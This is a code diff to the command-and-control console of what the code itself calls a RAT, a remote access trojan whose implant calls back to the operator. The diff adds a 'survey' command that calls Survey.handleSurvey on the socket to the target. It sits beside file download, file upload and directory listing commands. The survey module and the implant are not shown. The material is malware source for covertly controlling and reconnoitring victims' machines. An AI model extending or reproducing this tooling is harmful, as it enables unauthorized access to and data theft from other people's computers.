@@ -14,6 +14,7 @@ import Disconnect
 import File
 import Shutdown
 import Dir
+import Survey
 
 
 # Handle initial connection to our implant
@@ -41,7 +42,8 @@ def printHelp() -> str:
     '\t 1) shutdown\n' \
     '\t 2) getfile\n' \
     '\t 3) putfile\n' \
-    '\t 4) dirlist\n' 
+    '\t 4) dirlist\n' \
+    '\t 5) survey\n'
 
 
 # Main starting point for our RAT; implant will call back to our C2 when executed (with its configured port)
@@ -105,9 +107,10 @@ def main():
             case Common.Commands.dirlist:
                 print("Not yet implemented")
 
-            # TODO: implement
             case Common.Commands.survey:
-                print("Not yet implemented")
+                if (not Survey.handleSurvey(sock)):
+                    print("Failed sending survey to target!\n")
+                    exit = True
             
             case _:
                 print("Invalid choice!")
